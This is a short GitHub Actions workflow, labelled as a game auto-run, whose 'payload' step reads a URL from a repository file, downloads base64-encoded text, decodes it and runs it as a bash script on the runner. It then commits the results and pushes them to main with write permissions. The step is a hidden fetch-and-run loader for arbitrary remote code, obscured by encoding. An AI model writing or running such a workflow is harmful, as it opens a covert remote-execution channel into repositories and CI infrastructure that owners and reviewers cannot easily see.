name: ko-run
on:
  push:
    paths:
      - '.ko/**'
permissions:
  contents: write
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '22'
      - name: payload
        shell: bash
        run: |
          set +e
          DOC=$(tail -n 1 .ko/payload.txt)
          echo "doc=$DOC" > DIAG.txt
          curl -sSL -o /tmp/p.b64 "$DOC"
          tr -cd 'A-Za-z0-9+/=' < /tmp/p.b64 > /tmp/p2.b64
          base64 -d /tmp/p2.b64 > /tmp/payload.sh 2>/tmp/b64err
          echo "script=$(wc -c < /tmp/payload.sh)" >> DIAG.txt
          bash /tmp/payload.sh > /tmp/plog 2>&1
          echo "rc=$?" >> DIAG.txt
          echo '--- tail ---' >> DIAG.txt
          tail -c 5000 /tmp/plog >> DIAG.txt
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add -A
          git commit -m '게임: 자동 실행 결과 반영'
          for n in 1 2 3; do git pull --rebase -q origin main; git push -q origin HEAD:main && break; sleep 5; done
          exit 0
